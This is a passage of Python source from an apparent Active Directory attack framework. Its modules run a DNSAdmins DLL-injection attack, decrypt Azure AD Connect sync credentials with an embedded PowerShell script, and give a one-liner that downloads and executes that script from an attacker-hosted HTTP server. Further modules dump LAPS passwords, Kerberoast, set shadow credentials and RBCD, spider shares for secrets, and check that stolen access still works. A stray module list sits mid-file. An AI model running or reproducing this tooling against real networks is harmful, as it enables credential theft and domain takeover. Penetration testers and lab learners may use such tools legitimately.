            log(f'  Run on target: {WHITE}{" ".join(dnscmd)}{RESET}','info')

            log(f'Step 2: Restart DNS service to trigger DLL load','info')
            log(f'  Run on target: {WHITE}sc stop dns && sc start dns{RESET}','info')

            # if we have exec capability, try it directly
            if os.environ.get('KRB5CCNAME') or target.hash or target.password:
                choice = self.ask('run via wmiexec now?','n',['y','n'])
                if choice == 'y':
                    wmi = check_tool('impacket-wmiexec','wmiexec.py')
                    if wmi:
                        auth, extra = target.imp_str()
                        run_cmd([wmi]+auth+extra+[dc_host,
                                 f'dnscmd {dc_host} /config /serverlevelplugindll {dll_path}'],
                                label='dnscmd via wmiexec')
                        run_cmd([wmi]+auth+extra+[dc_host,'sc stop dns'],
                                label='stop dns')
                        run_cmd([wmi]+auth+extra+[dc_host,'sc start dns'],
                                label='start dns')
                        add_result('dnsadmins','DLL loaded via DNS restart')

            log(f'{ORANGE}Note: DNS service restart may cause brief outage — cleanup after{RESET}','warn')

        elif action == 'cleanup':
            log('Remove malicious DLL from DNS config','info')
            dc_host = target.dc_fqdn or target.dc
            wmi = check_tool('impacket-wmiexec','wmiexec.py')
            if wmi:
                auth, extra = target.imp_str()
                run_cmd([wmi]+auth+extra+[dc_host,
                         f'dnscmd {dc_host} /config /serverlevelplugindll ""'],
                        label='remove DLL')
                run_cmd([wmi]+auth+extra+[dc_host,'sc stop dns && sc start dns'],
                        label='restart dns clean')
        hr()


# =============================================================================
# AZUREADSYNC — Azure AD Connect credential extraction
# =============================================================================
class AzureADSync(Module):
    name='azureadsync'; description='Azure AD Connect — extract MSOL_ credentials, DCSync via sync account'; category='credentials'
    def run(self, target):
        if not self.req(target): return
        hr()
        action = self.ask('action','enum',['enum','msol','extract','dcsync'])
        hr()

        if action == 'enum':
            log('Enumerate Azure AD Connect infrastructure','info')
            nxc = check_tool('netexec','nxc','crackmapexec','cme')
            if nxc:
                base = [nxc,'ldap',target.dc_fqdn or target.dc]+target.nxc_args()
                run_cmd(base+['--query','(sAMAccountName=MSOL_*)','sAMAccountName,description,pwdLastSet'],
                        label='find MSOL accounts')
                run_cmd(base+['--query','(description=*Azure*)','sAMAccountName,description'],
                        label='find Azure accounts')
            log(f'Look for Azure AD Connect server — usually a member server with ADSync service','info')

        elif action in ('msol','extract'):
            log('Extract MSOL_ credentials from Azure AD Connect server','info')
            log(f'{ORANGE}Connects to ADSync DB via TCP 127.0.0.1 — must run as mhope or Azure Admins member{RESET}','warn')
            ewrm    = check_tool('evil-winrm')
            dc_host = target.dc  # use IP not FQDN

            # write adconnect.ps1 to loot dir — connects via 127.0.0.1:1433 (TCP) not LocalDB pipe
            adconnect_ps1 = os.path.join(target.loot_dir, 'adconnect.ps1')
            adconnect_content = r"""param([string]$server="127.0.0.1",[string]$db="ADSync")
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=$server;Database=$db;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id,instance_id,entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0); $instance_id = $reader.GetGuid(1); $entropy = $reader.GetGuid(2)
$reader.Close()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml,encrypted_configuration FROM mms_management_agent WHERE ma_type='AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0); $crypted = $reader.GetString(1)
$reader.Close(); $client.Close()
$binPath = 'C:\Program Files\Microsoft Azure AD Sync\Bin'
Add-Type -Path "$binPath\mcrypt.dll"
Add-Type -Path "$binPath\Microsoft.IdentityManagement.Logging.dll" -ErrorAction SilentlyContinue
Add-Type -Path "$binPath\Microsoft.IdentityManagement.AgentManagement.dll" -ErrorAction SilentlyContinue
[System.Reflection.Assembly]::LoadFile("$binPath\mcrypt.dll") | Out-Null
$km = New-Object -TypeName Microsoft.IdentityManagement.AgentManagement.Engine.KeyManager
$km.SetCryptographyKeyContainer([guid]$instance_id)
$key = $null; $km.GetActiveCredentialKey([ref]$key)
$key2 = $null; $km.GetKey(1,[ref]$key2)
$decrypted = $null; $key2.DecryptBase64ToString($crypted,[ref]$decrypted)
$domain   = select-xml -Content $config    -XPath "//parameter[@name='forest-login-domain']" | select @{Name='Domain';   Expression={$_.node.InnerXML}}
$username = select-xml -Content $config    -XPath "//parameter[@name='forest-login-user']"   | select @{Name='Username'; Expression={$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute"                               | select @{Name='Password'; Expression={$_.node.InnerText}}
Write-Host ("[+] Domain:   " + $domain.Domain)
Write-Host ("[+] Username: " + $username.Username)
Write-Host ("[+] Password: " + $password.Password)
"""
            with open(adconnect_ps1, 'w') as f: f.write(adconnect_content)
            log(f'{GREEN}adconnect.ps1 written to {WHITE}{adconnect_ps1}{RESET}','success')

            # start HTTP server to serve it
            import threading as _thr
            import http.server as _hs
            import socketserver as _ss
            _srv = None
            def _serve():
                global _srv
                os.chdir(target.loot_dir)
                handler = _hs.SimpleHTTPRequestHandler
                handler.log_message = lambda *a: None
                with _ss.TCPServer(('',8888), handler) as httpd:
                    _srv = httpd
                    httpd.serve_forever()
            _t = _thr.Thread(target=_serve, daemon=True); _t.start()
            import time as _time; _time.sleep(0.5)

            # get attacker IP from tun0
            import subprocess as _sp2
            try:
                _tun_ip = _sp2.check_output(
                    "ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1",
                    shell=True, text=True).strip()
            except Exception: _tun_ip = ''
            if not _tun_ip: _tun_ip = self.ask('your tun0 IP')

            log(f'{GREEN}HTTP server running on {WHITE}{_tun_ip}:8888{RESET}','success')
            log(f'{ORANGE}Inside evil-winrm shell run:{RESET}','warn')
            log(f'  {C0}& ([scriptblock]::Create((New-Object Net.WebClient).DownloadString("http://{_tun_ip}:8888/adconnect.ps1"))) -server 127.0.0.1 -db ADSync{RESET}','info')

            if ewrm:
                log(f'{PINK}Opening evil-winrm shell...{RESET}','info'); hr()
                if target.hash:
                    cmd = [ewrm,'-i',dc_host,'-u',target.user,'-H',target.hash]
                elif target.password:
                    cmd = [ewrm,'-i',dc_host,'-u',target.user,'-p',target.password]
                else:
                    log('Set creds first','error'); hr(); return
                pid = os.fork()
                if pid == 0: os.execvp(cmd[0], cmd)
                else: os.waitpid(pid, 0)

            hr()
            msol = self.ask('username from output (blank to skip pivot)','')
            pw   = self.ask('password from output','')
            if msol and pw:
                target.user = msol; target.password = pw; target.hash = None
                TARGET.user = msol; TARGET.password = pw; TARGET.hash = None
                log(f'{GREEN}Pivoted to {WHITE}{msol}{RESET} — run dcsync','success')
                add_result('azureadsync', f'creds: {msol}')
                # save to cracked.txt
                cracked = os.path.join(target.loot_dir,'cracked.txt')
                with open(cracked,'a') as f: f.write(f'{msol}:{pw}\n')
                log(f'{GREEN}Saved to {WHITE}{cracked}{RESET}','success')

        elif action == 'dcsync':
            log('DCSync using MSOL_ / sync account (has DS-Replication rights)','info')
            t = check_tool('impacket-secretsdump','secretsdump.py')
            if not t: log('impacket-secretsdump not found','error'); hr(); return
            dc = target.dc_fqdn or target.dc
            auth, extra = target.imp_str(dc)
            cmd = [t]+auth+extra+['-just-dc-ntlm']
            run_cmd(cmd, label='secretsdump via sync account')
            add_result('azureadsync','DCSync via MSOL account')
        hr()


# =============================================================================
# LAPSTOOLKIT — comprehensive LAPS auditing and password extraction
# =============================================================================
class LAPSToolkit(Module):
    name='lapstoolkit'; description='LAPSToolkit — comprehensive LAPS audit: find readers, dump passwords, find expiry'; category='credentials'
    def run(self, target):
        if not self.req(target): return
        hr()
        action = self.ask('action','audit',['audit','dump','readers','expiry'])
        hr()

        nxc  = check_tool('netexec','nxc','crackmapexec','cme')
        base = [nxc,'ldap',target.dc_fqdn or target.dc]+target.nxc_args() if nxc else []

        if action == 'audit':
            log('Full LAPS audit — enabled computers, readers, passwords','info')
            if nxc:
                run_cmd(base+['--laps'], label='nxc LAPS dump')
                run_cmd(base+['--query',
                              '(&(objectClass=computer)(ms-Mcs-AdmPwd=*))','name,ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime'],
                        label='nxc LAPS passwords')
            bloody = check_tool('bloodyad','bloodyAD')
            if bloody:
                run_cmd([bloody,'--host',target.dc_fqdn or target.dc,
                         '-d',target.domain]+target.bloodyad_args()+
                        ['get','search','--filter',
                         '(&(objectClass=computer)(ms-Mcs-AdmPwd=*))','--attr',
                         'sAMAccountName,ms-Mcs-AdmPwd'],
                        label='bloodyAD LAPS dump')

        elif action == 'dump':
            log('Dump LAPS passwords for all computers','info')
            if not nxc: log('netexec required','error'); hr(); return
            rc, lines = run_cmd_capture(base+['--laps'], label='nxc LAPS')
            hits = [l for l in lines if 'Password' in l or 'ms-Mcs' in l.lower()]
            if hits:
                log(f'{GREEN}{len(hits)} LAPS password(s) found{RESET}','success')
                laps_file = os.path.join(target.loot_dir,'laps_passwords.txt')
                with open(laps_file,'w') as f: f.write('\n'.join(hits))
                log(f'Saved: {WHITE}{laps_file}{RESET}','info')
                add_result('lapstoolkit', f'{len(hits)} LAPS pwd(s)')
            else:
                log('No LAPS passwords readable — check if you have read rights','warn')

        elif action == 'readers':
            log('Find who can read LAPS passwords (ACL audit)','info')
            if not nxc: log('netexec required','error'); hr(); return
            run_cmd(base+['--query',
                          '(objectClass=computer)','name,ms-Mcs-AdmPwd,nTSecurityDescriptor'],
                    label='nxc LAPS ACL')
            log(f'Tip: use {C0}pathfind{RESET} to find accounts with ReadLAPSPassword edge in BloodHound','info')

        elif action == 'expiry':
            log('Find computers with expired or soon-expiring LAPS passwords','info')
            if not nxc: log('netexec required','error'); hr(); return
            run_cmd(base+['--query',
                          '(&(objectClass=computer)(ms-Mcs-AdmPwdExpirationTime=*))','name,ms-Mcs-AdmPwdExpirationTime'],
                    label='nxc LAPS expiry')
        hr()



    Enum, LDAPEnum, BloodyEnum, Kerbrute, Enum4Linux, RPCEnum, GPPPassword, ADRecon, ADIDNSDump, Unauth,
    Kerberoast, ASREPRoast, Spray,
    SecretsDump, DCSync, PassTheHash, PassTheTicket, NXCExec, BloodyAttack, PassTheCert,
    Pathfind,
    Certipy, NTLMRelay, MITM6, Coerce, ZeroLogon, NoPac,
    GoldenTicket, SilverTicket, RBCD, ShadowCredentials, PrintNightmare, Rubeus,
    SPNJack, BadSuccessor, AddComputer,
    ShareSpider, LAPS, GMSA, DPAPI, MSSQL, HashCrack,

# =============================================================================
# HEALTHCHECK — validate discovered credentials and attack paths still work
# =============================================================================

# =============================================================================
# SMBCLIENT-NG — fast interactive SMB shell with ACL, tree, cat, mount
# =============================================================================
class SMBClientNG(Module):
    name='smbclientng'; description='smbclient-ng — fast interactive SMB shell: tree, cat, acls, mount, sizeof, PTH/Kerberos'; category='lateral'
    def run(self, target):
        if not self.req(target): return
        t = self.need('smbclientng','smbclient-ng')
        if not t: return
        hr()
        log(f'{C0}smbclient-ng — interactive SMB shell{RESET}','info')
        log(f'{GREY}Commands: ls, cd, get, put, cat, tree, acls, sizeof, mount, shares{RESET}','info')

        host   = self.ask('target host', target.dc_fqdn or target.dc)
        action = self.ask('mode','interactive',['interactive','command','shares','spider'])

        # build auth args
        auth = []
        ccache = os.environ.get('KRB5CCNAME','')
        use_krb = bool(ccache and os.path.exists(ccache) and target.user)

        if use_krb:
            auth = ['-k','--kdcHost',target.dc]
            log(f'{GREEN}Kerberos auth — ccache{RESET}','info')
        else:
            if target.domain: auth += ['-d',target.domain]
            if target.user:   auth += ['-u',target.user]
            if target.password: auth += ['-p',target.password]
            elif target.hash:   auth += ['--hashes',target.hash]

        base_cmd = [t,'-H',host] + auth

        if action == 'interactive':
            log(f'{GREEN}Opening interactive shell...{RESET}','success')
            log(f'{GREY}Tip: use <share> to connect, tree to list recursively, cat to read files{RESET}','info')
            hr()
            subprocess.call(base_cmd)

        elif action == 'command':
            cmd_str = self.ask('command to run (e.g. "ls C$")','')
            if not cmd_str: hr(); return
            out_dir = os.path.join(target.loot_dir,'smbclientng')
            os.makedirs(out_dir, exist_ok=True)
            run_cmd(base_cmd + ['-C',cmd_str], label=f'smbclient-ng: {cmd_str}')

        elif action == 'shares':
            log('Listing shares...','info')
            run_cmd(base_cmd + ['-C','shares'], label='smbclient-ng shares')

        elif action == 'spider':
            share = self.ask('share to spider','C$')
            depth = self.ask('max depth','3')
            out   = os.path.join(target.loot_dir,'smbclientng',f'{share}_tree.txt')
            os.makedirs(os.path.dirname(out), exist_ok=True)
            log(f'Spidering {WHITE}{share}{RESET} (depth {depth})...','info')
            rc, lines = run_cmd_capture(
                base_cmd + ['-C',f'use {share};tree'],
                label=f'smbclient-ng tree {share}')
            if lines:
                with open(out,'w') as f: f.write('\n'.join(lines))
                log(f'{GREEN}Tree saved → {WHITE}{out}{RESET}','success')
                # highlight interesting files
                interesting = [l for l in lines if any(x in l.lower() for x in
                    ['.ps1','.bat','.xml','.config','.ini','.kdbx','.pfx','.key',
                     'password','secret','credential','backup','.xlsx','.doc'])]
                if interesting:
                    log(f'{PINK}{len(interesting)} interesting file(s) found{RESET}','success')
                    for l in interesting[:20]: print(f'  {PINK}→{RESET} {l}')
                    add_result('smbclientng', f'{len(interesting)} interesting files in {share}')
        hr()


# =============================================================================
# POWERVIEW.PY — Python PowerView: full AD recon, ACL queries, attack primitives
# =============================================================================
class PowerViewPy(Module):
    name='powerview'; description='powerview.py — full PowerView AD recon: Get-DomainUser/Group/ACL/GPO, Invoke-Kerberoast, shadow creds, RBCD, vuln detection'; category='recon'
    def run(self, target):
        if not self.req(target): return
        t = self.need('powerview','powerview.py')
        if not t: return
        hr()
        log(f'{C0}powerview.py — PowerView on steroids{RESET}','info')

        action = self.ask('action','interactive',
            ['interactive','users','groups','acl','spns','asrep','trusts',
             'computers','gpo','ca','shadow','rbcd','vuln','recon'])

        # build connection string
        ccache = os.environ.get('KRB5CCNAME','')
        use_krb = bool(ccache and os.path.exists(ccache))

        if use_krb:
            conn_str = f'{target.dc}'
            auth_args = ['-k']
        elif target.hash:
            conn_str = f'{target.domain}/{target.user}@{target.dc}'
            auth_args = ['--hashes',target.hash]
        elif target.password:
            conn_str = f'{target.domain}/{target.user}:{target.password}@{target.dc}'
            auth_args = []
        else:
            conn_str = f'{target.dc}'
            auth_args = []

        base = [t, conn_str] + auth_args
        out_dir = os.path.join(target.loot_dir,'powerview')
        os.makedirs(out_dir, exist_ok=True)

        hr()

        if action == 'interactive':
            log(f'{GREEN}Opening interactive powerview shell...{RESET}','success')
            log(f'{GREY}Key commands: Get-DomainUser, Get-DomainGroup, Get-DomainObjectAcl{RESET}','info')
            log(f'{GREY}             Invoke-Kerberoast, Get-DomainCA, Set-ShadowCredential{RESET}','info')
            log(f'{GREY}             Get-DomainGPO, Get-DomainTrust, Find-LocalAdminAccess{RESET}','info')
            hr()
            subprocess.call(base)

        elif action == 'users':
            out = os.path.join(out_dir,'users.txt')
            rc, lines = run_cmd_capture(
                base + ['-C','Get-DomainUser -Properties samaccountname,description,memberof,adminCount -OutFile '+out],
                label='powerview Get-DomainUser')
            # parse passwords in descriptions
            _scan_descriptions(lines, target.loot_dir, target.domain or '')

        elif action == 'groups':
            run_cmd(base + ['-C','Get-DomainGroup -Properties name,member,description'],
                    label='powerview Get-DomainGroup')

        elif action == 'acl':
            identity = self.ask('identity (user/group to check ACLs for)', target.user or '')
            if not identity: hr(); return
            out = os.path.join(out_dir,'acl.txt')
            run_cmd(base + ['-C',f'Get-DomainObjectAcl -Identity {identity} -ResolveGUIDs -OutFile {out}'],
                    label=f'powerview ACL for {identity}')

        elif action == 'spns':
            out = os.path.join(out_dir,'kerberoast.txt')
            rc, lines = run_cmd_capture(
                base + ['-C',f'Invoke-Kerberoast -OutputFormat Hashcat -OutFile {out}'],
                label='powerview Invoke-Kerberoast')
            if lines and any('$krb5tgs$' in l for l in lines):
                log(f'{GREEN}TGS hashes saved → {WHITE}{out}{RESET}','success')
                add_result('powerview','kerberoast hashes captured')

        elif action == 'asrep':
            out = os.path.join(out_dir,'asrep.txt')
            run_cmd(base + ['-C',f'Invoke-ASREPRoast -OutputFormat Hashcat -OutFile {out}'],
                    label='powerview Invoke-ASREPRoast')

        elif action == 'trusts':
            run_cmd(base + ['-C','Get-DomainTrustMapping'],
                    label='powerview Get-DomainTrustMapping')

        elif action == 'computers':
            run_cmd(base + ['-C','Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogon'],
                    label='powerview Get-DomainComputer')

        elif action == 'gpo':
            run_cmd(base + ['-C','Get-DomainGPO'],
                    label='powerview Get-DomainGPO')

        elif action == 'ca':
            log('Enumerating Certificate Authorities and vulnerable templates...','info')
            run_cmd(base + ['-C','Get-DomainCA'],
                    label='powerview Get-DomainCA')
            run_cmd(base + ['-C','Get-DomainCATemplate -Vulnerable'],
                    label='powerview Get-DomainCATemplate -Vulnerable')

        elif action == 'shadow':
            identity = self.ask('target user/computer','')
            if not identity: hr(); return
            run_cmd(base + ['-C',f'Set-ShadowCredential -Identity {identity}'],
                    label=f'powerview Set-ShadowCredential {identity}')
            add_result('powerview',f'shadow cred set on {identity}')
            track_cleanup('shadow_cred', f'shadow credential on {identity}',
                lambda: run_cmd(base+['-C',f'Remove-ShadowCredential -Identity {identity}']))

        elif action == 'rbcd':
            target_comp = self.ask('target computer','')
            delegate_to = self.ask('computer to delegate from (attacker-controlled)','')
            if not target_comp or not delegate_to: hr(); return
            run_cmd(base + ['-C',f'Set-RBCD -Identity {target_comp} -DelegateFrom {delegate_to}'],
                    label=f'powerview Set-RBCD')
            add_result('powerview',f'RBCD: {delegate_to} → {target_comp}')

        elif action == 'vuln':
            log('Running integrated vulnerability scan...','info')
            run_cmd(base + ['-C','Get-Domain'],
                    label='powerview domain vuln check')
            run_cmd(base + ['-C','Get-DomainUser -Properties samaccountname,userAccountControl -Where "userAccountControl has_flag 0x00000020"'],
                    label='powerview PASSWD_NOTREQD users')

        elif action == 'recon':
            log('Full domain recon via Invoke-DomainRecon...','info')
            out = os.path.join(out_dir,'recon.txt')
            run_cmd(base + ['-C',f'Invoke-DomainRecon -OutFile {out}'],
                    label='powerview Invoke-DomainRecon')
            if os.path.exists(out):
                add_result('powerview',f'domain recon → {out}')

        hr()


# =============================================================================
# PYWERVIEW — Python PowerView: userhunter, GPO admin, local admin check, sessions
# =============================================================================
class PywerView(Module):
    name='pywerview'; description='PywerView — userhunter, GPO admin paths, local admin check, sessions, processes'; category='recon'
    def run(self, target):
        if not self.req(target): return
        t = check_tool('pywerview','pywerview.py')
        if not t:
            log('pywerview not found','error')
            log(f'Install: {WHITE}pip install pywerview --break-system-packages{RESET}','info')
            log(f'Or: {WHITE}pip install "pywerview[kerberos]" --break-system-packages{RESET}','info')
            hr(); return
        hr()
        action = self.ask('action','userhunter',[
            'userhunter','localadmin','gpogroup','gpoadmin','sessions',
            'loggedon','processes','objectacl','fileservers'])
        hr()

        ccache  = os.environ.get('KRB5CCNAME','')
        use_krb = bool(ccache and os.path.exists(ccache))
        dc      = target.dc_fqdn or target.dc

        def _base():
            b = [t]
            return b

        def _ldap_auth():
            # LDAP commands use -t for DC — must be IP not FQDN
            a = ['-t', target.dc, '-w', target.domain, '-u', target.user]
            if target.hash:       a += ['--hashes', f':{target.hash}']
            elif target.password: a += ['-p', target.password]
            else:                 a += ['-p', '']
            return a

        def _smb_auth(host):
            # SMB/RPC commands use --computername, no -t
            a = ['--computername', host, '-w', target.domain, '-u', target.user]
            if target.hash:    a += ['--hashes', f':{target.hash}']
            elif target.password: a += ['-p', target.password]
            else:              a += ['-p', '']
            return a

        if action == 'userhunter':
            log('invoke-userhunter — find which machines domain users are logged into','info')
            log(f'{ORANGE}This generates significant network traffic — use with care{RESET}','warn')
            user = self.ask('hunt for specific user (blank = all admins)','')
            cmd  = _base() + ['invoke-userhunter'] + _ldap_auth()
            if user: cmd += ['--username', user]
            run_cmd(cmd, label='pywerview userhunter')
            add_result('pywerview', f'userhunter: {user or "all admins"}')

        elif action == 'localadmin':
            log('invoke-checklocaladminaccess — find hosts where current user has local admin','info')
            host = self.ask('target host', dc)
            cmd  = _base() + ['invoke-checklocaladminaccess'] + _smb_auth(host)
            run_cmd(cmd, label='pywerview localadmin check')
            add_result('pywerview', 'local admin check complete')

        elif action == 'gpogroup':
            log('get-netgpogroup — find GPOs that grant local admin rights','info')
            cmd = _base() + ['get-netgpogroup'] + _ldap_auth()
            run_cmd(cmd, label='pywerview gpogroup')
            add_result('pywerview', 'GPO group mappings enumerated')

        elif action == 'gpoadmin':
            log('find-gpocomputeradmin — find who has admin on a computer via GPO','info')
            computer = self.ask('target computer (e.g. DC01)')
            cmd = _base() + ['find-gpocomputeradmin'] + _ldap_auth() + \
                  ['--computername', computer]
            run_cmd(cmd, label='pywerview gpoadmin')

        elif action == 'sessions':
            log('get-netsession — active sessions on target host','info')
            host = self.ask('target host', dc)
            cmd  = _base() + ['get-netsession'] + _smb_auth(host)
            run_cmd(cmd, label='pywerview sessions')

        elif action == 'loggedon':
            log('get-netloggedon — users actively logged on via RPC','info')
            host = self.ask('target host', dc)
            cmd  = _base() + ['get-netloggedon'] + _smb_auth(host)
            run_cmd(cmd, label='pywerview loggedon')

        elif action == 'processes':
            log('get-netprocess — running processes on remote host','info')
            host = self.ask('target host', dc)
            cmd  = _base() + ['get-netprocess'] + _smb_auth(host)
            run_cmd(cmd, label='pywerview processes')

        elif action == 'objectacl':
            log('get-objectacl — full ACL of any AD object','info')
            obj    = self.ask('object (sAMAccountName, DN, or SID)')
            filter = self.ask('rights filter','all',['all','reset-password','write-members'])
            cmd = _base() + ['get-objectacl'] + _ldap_auth()
            if obj: cmd += ['--sam-account-name', obj]
            if filter != 'all': cmd += ['--rights-filter', filter]
            cmd += ['--resolve-guids']
            log(f'{GREY}Highlighting: write_dacl, write_owner, generic_all, extended_right{RESET}','info')
            hr()

            import subprocess as _sp_pw
            r = _sp_pw.run(cmd, capture_output=True, text=True, errors='replace')
            interesting_rights = ['write_dacl','write_owner','generic_all','extended_right','self']
            current_block = []
            for line in (r.stdout + r.stderr).splitlines():
                current_block.append(line)
                if line.strip().startswith('iscallbak'):
                    # check if this block has interesting rights
                    block_text = '\n'.join(current_block)
                    is_interesting = any(right in block_text for right in interesting_rights)
                    if is_interesting:
                        for bl in current_block:
                            if 'activedirectoryrights' in bl or 'securityidentifier' in bl or 'objectacetype' in bl:
                                print(f'  {PINK if "write" in bl or "generic_all" in bl else GREEN}{bl}{RESET}')
                            elif 'objectdn' not in bl and 'objectsid' not in bl:
                                print(f'  {GREY}{bl}{RESET}')
                        print()
                    current_block = []

        elif action == 'fileservers':
            log('get-netfileserver — file servers from user homedirs/scriptpaths','info')
            cmd = _base() + ['get-netfileserver'] + _ldap_auth()
            run_cmd(cmd, label='pywerview fileservers')

        hr()


class HealthCheck(Module):
    name='healthcheck'; description='validate credentials, DCSync rights, backdoors — confirm what still works'; category='recon'
    def run(self, target):
        if not self.req(target): return
        hr()
        action = self.ask('action','all',['all','creds','dcsync','access','laps','gmsa'])
        hr()

        nxc    = check_tool('netexec','nxc','crackmapexec','cme')
        bloody = check_tool('bloodyad','bloodyAD')
        ccache = os.environ.get('KRB5CCNAME','')
        use_krb = bool(ccache and os.path.exists(ccache))
        dc     = target.dc_fqdn or target.dc
        ok = []; warn = []; fail = []

        def _tick(label, result, detail=''):
            if result:
                ok.append(label)
                log(f'{GREEN}✓ {WHITE}{label}{RESET}  {GREY}{detail}{RESET}','success')
            else:
                fail.append(label)
                log(f'{RED}✗ {WHITE}{label}{RESET}  {GREY}{detail}{RESET}','error')

        def _nxc_check(proto, extra_args, label):
            if not nxc: return False
            base = [nxc, proto, dc]
            if use_krb: base += ['-k','--use-kcache','-u',target.user]
            elif target.hash: base += ['-u',target.user,'-H',target.hash]
            elif target.password: base += ['-u',target.user,'-p',target.password]
            if target.domain: base += ['-d',target.domain]
            r = subprocess.run(base+extra_args, capture_output=True, text=True, timeout=15)
            return '[+]' in r.stdout and '[-]' not in r.stdout

        # ── credential validity ────────────────────────────────────────────
        if action in ('all','creds'):
            log('Checking credential validity...','info')
            try:
                smb_ok = _nxc_check('smb',[],'SMB auth')
                _tick('SMB auth', smb_ok, f'{target.user}@{dc}')
            except Exception as e:
                _tick('SMB auth', False, str(e))

            try:
                ldap_ok = _nxc_check('ldap',['--users'],'LDAP auth')
                _tick('LDAP auth', ldap_ok, f'{target.user}@{dc}')
            except Exception as e:
                _tick('LDAP auth', False, str(e))

            if use_krb:
                ccache_valid = os.path.exists(ccache)
                _tick('TGT ccache', ccache_valid, ccache)

            # check cracked.txt creds
            cracked = os.path.join(target.loot_dir,'cracked.txt')
            if os.path.exists(cracked):
                log('Validating cracked credentials...','info')
                for line in open(cracked):
                    line = line.strip()
                    if ':' not in line: continue
                    u, p = line.split(':',1)
                    if not nxc: continue
                    r = subprocess.run(
                        [nxc,'smb',dc,'-u',u,'-p',p,'-d',target.domain or ''],
                        capture_output=True, text=True, timeout=10)
                    valid = '[+]' in r.stdout
                    _tick(f'cred {u}', valid, 'still valid' if valid else 'INVALID — may have changed')

        # ── DCSync rights ──────────────────────────────────────────────────
        if action in ('all','dcsync'):
            log('Checking DCSync rights (DS-Replication-Get-Changes-All)...','info')
            if bloody:
                base = [bloody,'--host',dc,'-d',target.domain]
                if use_krb: base += ['-k']
                elif target.hash: base += ['-u',target.user,'-p',f':{target.hash}']
                elif target.password: base += ['-u',target.user,'-p',target.password]
                r = subprocess.run(base+['get','object',target.user,'--attr','objectSid'],
                                   capture_output=True, text=True, timeout=10)
                has_sid = 'objectSid' in r.stdout
                _tick('DCSync rights', has_sid, 'check ACL via pathfind for confirmation')

        # ── shell access ───────────────────────────────────────────────────
        if action in ('all','access'):
            log('Checking shell access...','info')
            try:
                winrm_ok = _nxc_check('winrm',[],'WinRM')
                _tick('WinRM access', winrm_ok, f'evil-winrm -i {dc} viable')
            except Exception as e:
                _tick('WinRM access', False, str(e))

            try:
                smb_admin = _nxc_check('smb',['--shares'],'SMB admin')
                # check for Pwn3d
                if nxc:
                    base = [nxc,'smb',dc]
                    if use_krb: base += ['-k','--use-kcache','-u',target.user]
                    elif target.hash: base += ['-u',target.user,'-H',target.hash,'-d',target.domain]
                    elif target.password: base += ['-u',target.user,'-p',target.password,'-d',target.domain]
                    r = subprocess.run(base, capture_output=True, text=True, timeout=10)
                    pwned = 'Pwn3d!' in r.stdout
                    _tick('Admin (Pwn3d!)', pwned, 'local admin on DC')
            except Exception as e:
                _tick('Admin check', False, str(e))

        # ── LAPS still readable ────────────────────────────────────────────
        if action in ('all','laps'):
            log('Checking LAPS readability...','info')
            if nxc:
                try:
                    base = [nxc,'ldap',dc]+(['-k','--use-kcache','-u',target.user] if use_krb
                           else ['-u',target.user,'-p',target.password or f':{target.hash}','-d',target.domain])
                    r = subprocess.run(base+['--laps'], capture_output=True, text=True, timeout=10)
                    laps_ok = 'ms-Mcs-AdmPwd' in r.stdout or '[+]' in r.stdout
                    _tick('LAPS readable', laps_ok, 'passwords still accessible')
                except Exception as e:
                    _tick('LAPS readable', False, str(e))

        # ── gMSA still readable ────────────────────────────────────────────
        if action in ('all','gmsa'):
            log('Checking gMSA readability...','info')
            if nxc:
                try:
                    base = [nxc,'ldap',dc]+(['-k','--use-kcache','-u',target.user] if use_krb
                           else ['-u',target.user,'-p',target.password or '','-d',target.domain])
                    r = subprocess.run(base+['--gmsa'], capture_output=True, text=True, timeout=10)
                    gmsa_ok = 'NTLM' in r.stdout and '<no read permissions>' not in r.stdout
                    _tick('gMSA readable', gmsa_ok, 'hash still extractable')
                except Exception as e:
                    _tick('gMSA readable', False, str(e))

        # ── summary ───────────────────────────────────────────────────────
        hr()
        print(f'\n  {GREEN}✓ {len(ok)} passing{RESET}   {RED}✗ {len(fail)} failed{RESET}   {ORANGE}! {len(warn)} warnings{RESET}\n')
        if fail:
            log(f'Failed checks: {WHITE}{", ".join(fail)}{RESET}','warn')
            log(f'Credentials or rights may have changed — re-run relevant modules','info')
        hr()



MODULES = {m.name: m for m in [
    Enum, LDAPEnum, BloodyEnum, Kerbrute, RPCEnum, GPPPassword, ADRecon, ADIDNSDump,
    Kerberoast, ASREPRoast, Spray,
    SecretsDump, DCSync, PassTheHash, PassTheTicket, NXCExec, BloodyAttack, Certipy,
    NTLMRelay, MITM6, Coerce, ZeroLogon, NoPac,
    GoldenTicket, SilverTicket, Delegation, RBCD, ShadowCredentials, PrintNightmare, Rubeus,
    Pathfind, SPNJack, BadSuccessor, ShareSpider, LAPS, GMSA, DPAPI, MSSQL,
    Trusts, ACLPersist, DCShadow, SMBClient, DiamondTicket, SapphireTicket,
    Nmap, FFuf, Unauth, HashCrack, AddComputer, PassTheCert, GroupScope, JEA, GodPotato,
    PyWhisker, PKINIT, UnPAC, LDAPShell, CrossDomain,
    NXCModules, NetEnum, OwnerEdit, PassiveSniff, Enrich, Timeroast, Coercion, ZipSlip, BackupAbuse, SliverModule, PathPwn,
    Ligolo, BloodHoundQuery, AutoEnum, RunasCs, KeePass, FTP,
    DPloot, SCCM, Pre2K, ADIDNS,
    SyncJacking, DNSAdmins, AzureADSync, LAPSToolkit, PywerView, HealthCheck,
    ACLScan, Trusts, Grouper2, ACLight, Lsassy, ADCSKiller, Snaffler, PyWSUS,
    Cleanup,
]}

# Load plugins after MODULES is fully defined
load_plugins(MODULES)

GROUPS = {
    'recon':        ['enum','ldapenum','bloodyenum','kerbrute','enum4linux','rpcenum','gpp','adrecon','dnsdump','adidns','pathfind','shares','mssql','unauth','bh-query','autoenum','ftp','healthcheck','pywerview','nmap','ffuf','nxcmodules','sccm','trusts','aclscan','grouper2','aclight','snaffler','powerview'],
